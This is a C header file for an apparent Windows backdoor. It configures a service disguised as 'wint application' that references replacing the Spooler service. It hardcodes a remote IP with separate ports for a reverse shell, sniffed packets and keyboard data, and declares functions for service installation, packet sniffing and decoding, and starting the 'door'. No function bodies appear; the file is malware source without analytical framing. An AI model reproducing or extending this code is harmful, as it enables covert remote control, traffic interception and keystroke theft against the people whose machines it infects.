//////////////////////////////////////////////////////////////
//author : superfish
//date : 2015/12/12
//name : wint.h
//thanks : yunshu
//////////////////////////////////////////////////////////////
#include <windows.h>

#ifndef _WINT_H
    #define _WINT_H
#endif

#define FUNC_NUM                       3
#define BUFFER_SIZE                    1024 * 10
#define SERVICE_NAME                   "wint"
#define SERVICE_DESCRIPTION            "wint application"
#define SERVICE_DISPLAY_NAME           "wintapp"
#define REPLACE_SERVICE_NAME           "Spooler" 
#define IP                             "115.29.55.61"
#define SHELLPORT                      "8080"
#define PACKPORT                       "8081"
#define KEYBOARDPORT                   "8082"     
//#define DEBUG 
#ifdef DEBUG
    #define DEBUG_LOG                  "c:\\debug.txt"
#endif

typedef struct ip_hdr //定义IP首部
{ 
    unsigned char      h_verlen; //4位首部长度,4位IP版本号 
    unsigned char      tos; //8位服务类型TOS      
    unsigned short     total_len; //16位总长度（字节） 
    unsigned short     ident; //16位标识 
    unsigned short     frag_and_flags; //3位标志位 
    unsigned char      ttl; //8位生存时间 TTL 
    unsigned char      proto; //8位协议 (TCP, UDP 或其他) 
    unsigned short     checksum; //16位IP首部校验和      
    unsigned int       sourceIP; //32位源IP地址 
    unsigned int       destIP; //32位目的IP地址 
}IP_HEADER;

typedef struct tcp_hdr //定义TCP首部 
{ 
    unsigned short     th_sport; //16位源端口 
    unsigned short     th_dport; //16位目的端口      
    unsigned int       th_seq; //32位序列号 
    unsigned int       th_ack; //32位确认号 
    unsigned char      th_lenres; //4位首部长度/6位保留字 
    unsigned char      th_flag; //6位标志位 
    unsigned short     th_win; //16位窗口大小 
    unsigned short     th_sum; //16位校验和      
    unsigned short     th_urp; //16位紧急数据偏移量      
}TCP_HEADER;

typedef struct udp_hdr //定义UDP首部
{
	unsigned short     uh_sport; //16位源端口
	unsigned short     uh_dport; //16位目的端口
	unsigned short     uh_len; //16位用户数据包长度
	unsigned short     uh_sum; //16位校验和
}UDP_HEADER;

typedef struct shell_argument //传递到shell的参数结构 
{
    char               ip[16]; //反连的ip地址 
    char               port[5]; //反连的端口 
}SHELL_ARGUMENT;

//service.cpp
BOOL ServiceInstall(char *exeFilePath);
BOOL ServiceUnstall(char *serviceName);
void ServiceMain(int args, char **argv);
void ServiceControl(DWORD request);
#ifdef DEBUG
void LogToFile(char *str);
#endif

//works.cpp
int Sniffer(LPVOID argument);
void Decode(char *recvBuffer, char *decodeBuffer);
void DecodeTCP(char *buffer, char *decodeBuffer);
void DecodeUDP(char *buffer, char *decodeBuffer);
int StartDoor(LPVOID argument);
BOOL StartWith(char *buf1, char *buf2);
